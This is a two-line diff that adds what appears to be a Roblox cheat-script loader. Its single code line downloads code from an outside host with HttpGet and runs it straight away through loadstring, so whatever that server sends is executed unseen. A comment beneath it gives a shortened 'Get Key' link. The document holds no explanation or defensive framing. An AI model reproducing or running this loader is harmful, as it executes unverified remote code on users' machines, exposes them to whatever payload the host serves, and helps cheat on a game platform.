@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://btteam.net/scripts-auth/', true))()
+-- Link Get Key : https://bit.ly/3QpcMYh
